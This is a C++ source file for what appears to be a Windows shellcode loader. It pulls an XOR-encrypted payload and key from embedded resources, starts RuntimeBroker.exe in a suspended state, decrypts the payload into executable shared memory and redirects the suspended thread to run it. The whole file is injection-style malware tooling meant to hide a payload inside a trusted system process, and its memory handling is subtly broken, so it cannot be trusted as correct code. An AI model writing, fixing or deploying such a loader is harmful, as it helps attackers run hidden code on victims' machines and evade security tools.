#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <random>
#include <cstdlib>
#include <ctime>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void its_load_re(const char* renamer, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    
    HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
    HGLOBAL resrdata = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(resrdata);
}

int main() {
    
    char* ke;
    DWORD keLen;
    its_load_re("dhanushkey1", &ke, &keLen);
    const char* processPath = "C:\\Windows\\System32\\RuntimeBroker.exe";
    char* code199k;
    DWORD code199kLen;
    its_load_re("dhanushcode56", &code199k, &code199kLen);

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    
    si.cb = sizeof(si);
    
    // Create a new process in a suspended state
    if (!CreateProcessA(processPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed with error code " << GetLastError() << std::endl;
        return -1;
    }

    // Get the thread context
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "GetThreadContext failed with error code " << GetLastError() << std::endl;
        return -1;
    }

    // Create a file mapping (shared memory)
    HANDLE hMapFile = CreateFileMappingA(
        INVALID_HANDLE_VALUE,  // Use system paging file
        NULL,                  // Default security
        PAGE_EXECUTE_READWRITE, // Read/Write access
        0,                     // Maximum object size (high-order DWORD)
        code199kLen,           // Maximum object size (low-order DWORD)
        NULL                   // Name of the mapping object
    );

    if (hMapFile == NULL) {
        std::cerr << "CreateFileMapping failed with error code " << GetLastError() << std::endl;
        return -1;
    }

    // Map the view of the file into the process's memory space
    LPVOID lpBase = MapViewOfFile(
        hMapFile,              // Handle to the mapping object
        FILE_MAP_ALL_ACCESS,   // Read/Write access
        0,                     // High-order DWORD of the file offset
        0,                     // Low-order DWORD of the file offset
        code199kLen            // Number of bytes to map
    );

    if (lpBase == NULL) {
        std::cerr << "MapViewOfFile failed with error code " << GetLastError() << std::endl;
        CloseHandle(hMapFile);
        return -1;
    }

    // XOR decrypt the code
    for (DWORD i = 0; i < code199kLen; i++) {
        code199k[i] ^= ke[i % keLen];
    }

    // Copy the decrypted payload into the mapped memory
    memcpy(lpBase, code199k, code199kLen);

    // Set the thread context to point to the mapped memory (entry point for execution)
    ctx.Rcx = (DWORD64)lpBase; // Set the appropriate register (for 64-bit systems, Rcx is used for the first argument)
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "SetThreadContext failed with error code " << GetLastError() << std::endl;
        UnmapViewOfFile(lpBase);
        CloseHandle(hMapFile);
        return -1;
    }

    // Resume the thread to execute the code
    ResumeThread(pi.hThread);

    // Cleanup
    UnmapViewOfFile(lpBase);
    CloseHandle(hMapFile);

    return 0;
}
